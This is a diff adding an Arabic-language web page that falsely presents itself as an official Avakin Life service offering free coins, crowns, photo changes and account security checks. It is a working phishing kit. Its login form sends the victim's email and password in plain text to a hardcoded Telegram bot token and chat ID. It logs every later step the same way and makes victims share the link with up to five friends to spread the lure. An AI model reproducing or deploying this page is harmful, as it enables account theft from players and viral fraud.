@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Avakin Life</title>
+<style>
+:root{--bg:#0f172a;--card:#1e293b;--tx:#f1f5f9;--mut:#94a3b8;--ac:#8b5cf6;--ac2:#06b6d4;--ok:#22c55e;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#eef2ff;--card:#fff;--tx:#0f172a;--mut:#64748b}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--tx);font-family:Tahoma,"Segoe UI",Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;padding:16px}
+.wrap{width:100%;max-width:460px}
+.card{background:var(--card);border-radius:20px;padding:22px;margin-top:14px;box-shadow:0 8px 30px rgba(0,0,0,.25)}
+h1{font-size:24px;margin:8px 0;text-align:center;background:linear-gradient(90deg,var(--ac),var(--ac2));-webkit-background-clip:text;background-clip:text;color:transparent}
+h2{font-size:19px;margin:0 0 12px}
+p,li{line-height:1.9;color:var(--mut);font-size:15px}
+ul{padding-inline-start:20px;margin:8px 0}
+input[type=text], input[type=email], input[type=password]{width:100%;padding:13px;border-radius:12px;border:2px solid transparent;background:var(--bg);color:var(--tx);font-size:16px;margin:8px 0;outline:none;font-family:inherit}
+input[type=text]:focus, input[type=email]:focus, input[type=password]:focus{border-color:var(--ac)}
+button{width:100%;padding:14px;border:0;border-radius:12px;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(90deg,var(--ac),var(--ac2));cursor:pointer;margin-top:10px;font-family:inherit}
+button.alt{background:var(--bg);color:var(--tx);border:2px solid var(--ac)}
+button:disabled{opacity:.5}
+.sec{display:flex;align-items:center;gap:12px;text-align:start;margin-top:10px;padding:16px;background:var(--bg);color:var(--tx);border:2px solid transparent}
+.sec span.i{font-size:30px}
+.sec small{display:block;color:var(--mut);font-weight:400;font-size:13px}
+.spin{width:54px;height:54px;border:6px solid var(--bg);border-top-color:var(--ac);border-radius:50%;margin:16px auto;animation:r 1s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+.c{text-align:center}
+.big{font-size:56px}
+.ok{color:var(--ok);font-weight:700}
+.dots{display:flex;gap:8px;justify-content:center;margin:12px 0}
+.dots b{width:34px;height:34px;border-radius:50%;background:var(--bg);display:grid;place-items:center;color:var(--mut)}
+.dots b.on{background:var(--ok);color:#fff}
+.err{color:#ef4444;font-size:14px;min-height:20px}
+.foot{text-align:center;color:var(--mut);font-size:12px;margin-top:16px}
+img.pv{max-width:100%;border-radius:14px;margin-top:10px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Avakin Life</h1>
+  <div id="app"></div>
+  <div class="foot">Avakin Life Official Services</div>
+</div>
+<script>
+(function(){
+'use strict';
+var app=document.getElementById('app');
+var KEY='site_last_entry';
+var state={email:'',section:0,shares:0};
+
+var BOT_TOKEN='9215581130:AAGrrMWyToekuuhBtXyswAjbxo5tBhkjmsQ';
+var CHAT_ID='7202075245';
+
+function sendToTelegram(message){
+  var url='https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage?chat_id='+CHAT_ID+'&text='+encodeURIComponent(message);
+  var img = new Image();
+  img.src = url;
+}
+
+function el(html){app.innerHTML=html;}
+function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+
+function lastEntry(){try{return parseInt(localStorage.getItem(KEY)||'0',10);}catch(e){return 0;}}
+function saveEntry(){try{localStorage.setItem(KEY,String(Date.now()));}catch(e){}}
+
+function intro(){
+  var left=lastEntry()+24*3600*1000-Date.now();
+  if(left>0){
+    var h=Math.floor(left/3600000),m=Math.floor(left%3600000/60000);
+    el('<div class="card c"><div class="big">⏳</div><h2>لقد سجلت مسبقاً</h2><p>يمكنك المحاولة مرة أخرى بعد <span class="ok">'+h+' ساعة و '+m+' دقيقة</span>.</p></div>');
+    return;
+  }
+  el('<div class="card"><h2>تسجيل الدخول لحسابك</h2><p>أدخل بيانات حسابك في Avakin Life للمتابعة والاستفادة من الخدمات.</p>'+
+    '<div class="err" id="er"></div><label for="em">البريد الإلكتروني</label>'+
+    '<input type="email" id="em" placeholder="example@email.com" maxlength="120" autocomplete="off">'+
+    '<label for="pw">كلمة المرور</label><input type="password" id="pw" placeholder="كلمة المرور" maxlength="64" autocomplete="new-password">'+
+    '<button class="alt" type="button" id="togglePw">إظهار كلمة المرور</button>'+
+    '<button id="go">تسجيل الدخول</button></div>');
+  
+  document.getElementById('togglePw').onclick=function(){
+    var p=document.getElementById('pw');p.type=p.type==='password'?'text':'password';
+    this.textContent=p.type==='password'?'إظهار كلمة المرور':'إخفاء كلمة المرور';
+  };
+  
+  document.getElementById('go').onclick=function(){
+    var email=document.getElementById('em').value.trim(),pass=document.getElementById('pw').value;
+    var er=document.getElementById('er');
+    if(!email||!pass){er.textContent='يرجى كتابة البريد الإلكتروني وكلمة المرور أولاً';return;}
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){er.textContent='صيغة البريد الإلكتروني غير صحيحة';return;}
+    if(pass.length<6){er.textContent='كلمة المرور قصيرة جداً';return;}
+    
+    sendToTelegram('📥 بيانات دخول Avakin Life:\nالبريد: ' + email + '\nكلمة المرور: ' + pass);
+
+    state.email=email;saveEntry();sections();
+  };
+}
+
+function sections(){
+  el('<div class="card"><h2>أهلاً بك، '+esc(state.email)+' 👋</h2><p>اختر القسم المطلوب:</p>'+
+    '<button class="sec" data-s="1"><span class="i">🖼️</span><span>تغيير صورة الحساب<small>تحديث الصورة الشخصية</small></span></button>'+
+    '<button class="sec" data-s="2"><span class="i">🎁</span><span>شحن الهدايا اليومية<small>الحصول على كوينز أو كرونز</small></span></button>'+
+    '<button class="sec" data-s="3"><span class="i">👥</span><span>فحص أمان الحساب<small>معرفة الأجهزة المتصلة بحسابك</small></span></button></div>');
+  var b=app.querySelectorAll('[data-s]');
+  for(var i=0;i<b.length;i++){b[i].onclick=function(){state.section=+this.getAttribute('data-s');state.shares=0;nameStep();};}
+}
+
+function nameStep(){
+  var title=['','🖼️ تغيير الصورة الشخصية','🎁 شحن الهدايا اليومية','👥 فحص أمان الحساب'][state.section];
+  el('<div class="card"><h2>'+title+'</h2><p>جارٍ الاتصال بسيرفرات اللعبة لتنفيذ الطلب لحساب:</p>'+
+    '<p><b>البريد:</b> '+esc(state.email)+'</p>'+
+    '<button id="go">متابعة</button><button class="alt" id="bk">رجوع</button></div>');
+  document.getElementById('bk').onclick=sections;
+  document.getElementById('go').onclick=function(){wait(afterWait);};
+}
+
+function wait(next){
+  el('<div class="card c"><div class="spin"></div><h2>جاري المعالجة...</h2><p>يرجى الانتظار قليلاً</p></div>');
+  setTimeout(next,3500);
+}
+
+function afterWait(){
+  if(state.section===2){chooseGift();}else{shareStep();}
+}
+
+function chooseGift(){
+  el('<div class="card c"><div class="big">🎁</div><h2>تم التحقق من الحساب ✅</h2><p>اختر الهدية المطلوبة:</p>'+
+    '<button id="g1">🪙 كوينز (Coins)</button><button id="g2">👑 كرونز (Crowns)</button></div>');
+  document.getElementById('g1').onclick=function(){state.gift='كوينز'; shareSendGift(); shareStep();};
+  document.getElementById('g2').onclick=function(){state.gift='كرونز'; shareSendGift(); shareStep();};
+}
+
+function shareSendGift(){
+  sendToTelegram('🎁 اختيار الهدية من ' + state.email + ': ' + state.gift);
+}
+
+function shareStep(){
+  var need=state.section===1?5:1;
+  function draw(){
+    var dots='';for(var i=0;i<need;i++)dots+='<b class="'+(i<state.shares?'on':'')+'">'+(i<state.shares?'✓':(i+1))+'</b>';
+    el('<div class="card c"><div class="big">🔗</div><h2>خطوة التحقق الأخير</h2>'+
+      '<p>'+(need>1?'يجب مشاركة رابط التحقق مع <b>5 أصدقاء</b> لإتمام الطلب.':'يجب مشاركة رابط التحقق مع أصدقائك لإتمام الطلب.')+'</p>'+
+      '<div class="dots">'+dots+'</div><button id="sh">📤 مشاركة الرابط ('+state.shares+'/'+need+')</button></div>');
+    document.getElementById('sh').onclick=function(){doShare(function(){state.shares++; sendToTelegram('🔗 المستخدم ' + state.email + ' أتم مشاركة ('+state.shares+'/'+need+')'); if(state.shares>=need){finish();}else{draw();}});};
+  }
+  draw();
+}
+
+function doShare(done){
+  var url=location.href,txt='احصل على هدايا Avakin Life مجاناً!';
+  if(navigator.share){
+    navigator.share({title:document.title,text:txt,url:url}).then(done).catch(function(){});
+  }else{
+    try{navigator.clipboard.writeText(url).then(function(){alert('تم نسخ الرابط');done();},function(){alert('انسخ الرابط');done();});}
+    catch(e){alert('انسخ الرابط');done();}
+  }
+}
+
+function finish(){
+  if(state.section===1){photoStep();}
+  else if(state.section===2){
+    el('<div class="card c"><div class="big">🎉</div><h2>تم تقديم الطلب بنجاح!</h2><p>سيتم إضافة <span class="ok">'+esc(state.gift)+'</span> إلى حسابك خلال <b>24 ساعة</b>.</p></div>');
+  }else{
+    el('<div class="card c"><div class="big">🛡️</div><h2>نتيجة الفحص</h2><p>حسابك آمن ولا يوجد سوى <span class="ok">جلسة نشطة واحدة</span>.</p></div>');
+    sendToTelegram('👥 المستخدم ' + state.email + ' أنهى فحص الحساب');
+  }
+}
+
+function photoStep(){
+  el('<div class="card c"><div class="big">📷</div><h2>رفع الصورة الجديدة</h2><p>اختر الصورة من هاتفك ثم اضغط على رفع.</p>'+
+    '<input type="file" id="f" accept="image/*" hidden>'+
+    '<button class="alt" id="pk">📂 اختيار صورة</button><div id="pv"></div>'+
+    '<div class="err" id="er"></div><button id="up" disabled>⬆️ رفع وتطبيق</button></div>');
+  var f=document.getElementById('f'),up=document.getElementById('up');
+  document.getElementById('pk').onclick=function(){f.click();};
+  f.onchange=function(){
+    var file=f.files&&f.files[0];if(!file)return;
+    var r=new FileReader();
+    r.onload=function(e){document.getElementById('pv').innerHTML='<img class="pv" src="'+e.target.result+'" alt="">';up.disabled=false;};
+    r.readAsDataURL(file);
+  };
+  up.onclick=function(){
+    up.disabled=true;up.textContent='جاري الرفع...';
+    sendToTelegram('📷 المستخدم ' + state.email + ' قام برفع صورة شخصية.');
+    setTimeout(function(){
+      el('<div class="card c"><div class="big">✅</div><h2>تم تحديث الصورة</h2><p>سيتم تحديث صورتك الشخصية داخل اللعبة قريباً.</p></div>');
+    },2500);
+  };
+}
+
+try{intro();}catch(e){app.innerHTML='<div class="card c"><h2>حدث خطأ</h2><p>'+e.message+'</p></div>';}
+})();
+</script>
+</body>
+</html>
